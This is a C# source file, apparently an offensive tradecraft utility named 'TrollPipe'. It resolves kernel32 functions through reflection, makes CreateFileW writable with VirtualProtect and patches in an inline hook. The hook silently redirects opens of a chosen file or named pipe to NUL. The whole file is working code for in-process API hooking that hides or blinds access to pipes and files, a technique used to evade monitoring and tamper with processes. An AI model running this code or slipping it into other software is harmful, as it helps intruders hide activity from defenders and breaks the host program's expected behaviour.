using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Reflection;

public static class TrollPipe
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr CreateFileW(string lpFileName,uint dwDesiredAccess,uint dwShareMode,IntPtr lpSecurityAttributes,uint dwCreationDisposition,uint dwFlagsAndAttributes,IntPtr hTemplateFile);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    public delegate IntPtr CreateFileWDelegate(string lpFileName,uint dwDesiredAccess,uint dwShareMode,IntPtr lpSecurityAttributes,uint dwCreationDisposition,uint dwFlagsAndAttributes,IntPtr hTemplateFile);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    public delegate bool delegateVirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);

    static public int oldProtect;
    static public IntPtr targetAddr, hookAddr;
    static public byte[] originalBytes = new byte[12];
    static public byte[] hookBytes = new byte[12];
    private static object hookLock = new object();
    static CreateFileWDelegate A;
    static public string fileorpipe = "";

    public static IntPtr GetProcAddress(string moduleName, string procedureName)
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
        Assembly systemAssembly = assemblies.FirstOrDefault(a =>
            a.GlobalAssemblyCache &&
            a.Location.EndsWith("System.dll", StringComparison.OrdinalIgnoreCase));
        Type unsafeNativeMethods = systemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods");
        MethodInfo getModuleHandle = unsafeNativeMethods.GetMethod("GetModuleHandle", new Type[] { typeof(string) });
        MethodInfo getProcAddress = unsafeNativeMethods.GetMethod("GetProcAddress", new Type[] { typeof(HandleRef), typeof(string) });
        object hModule = getModuleHandle.Invoke(null, new object[] { moduleName });
        IntPtr dummyPtr = IntPtr.Zero;
        HandleRef handleRef = new HandleRef(dummyPtr, (IntPtr)hModule);
        object procAddress = getProcAddress.Invoke(null, new object[] { handleRef, procedureName });
        return (IntPtr)procAddress;
    }

    public static void DisappearFileorPipe(string fileorpipe_arg)
    {
        fileorpipe = fileorpipe_arg;
        A = CreateFileWDelegateDetour;
        hookAddr = Marshal.GetFunctionPointerForDelegate(A);
        targetAddr = GetProcAddress("kernel32.dll", "CreateFileW");
        Marshal.Copy(targetAddr, originalBytes, 0, 12);
        hookBytes = new byte[] { 72, 184 }.Concat(BitConverter.GetBytes((long)(ulong)hookAddr)).Concat(new byte[] { 80, 195 }).ToArray();
        IntPtr VPAddr = GetProcAddress("kernel32.dll", "VirtualProtect");
        var VirtualProtect = (delegateVirtualProtect)Marshal.GetDelegateForFunctionPointer(VPAddr, typeof(delegateVirtualProtect));
        VirtualProtect(targetAddr, 12, 0x40, out oldProtect);
        Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);

    }

    static public IntPtr CreateFileWDelegateDetour(string lpFileName,uint dwDesiredAccess,uint dwShareMode,IntPtr lpSecurityAttributes,uint dwCreationDisposition,uint dwFlagsAndAttributes,IntPtr hTemplateFile)
    {
        try
        {
            Marshal.Copy(originalBytes, 0, targetAddr, hookBytes.Length);
            if (lpFileName.Contains(fileorpipe))
            {
                return CreateFileW("NUL", 0x40000000 | 0x80000000, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
            }
            return CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
        }
        finally
        {
            Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);
        }
    }
}

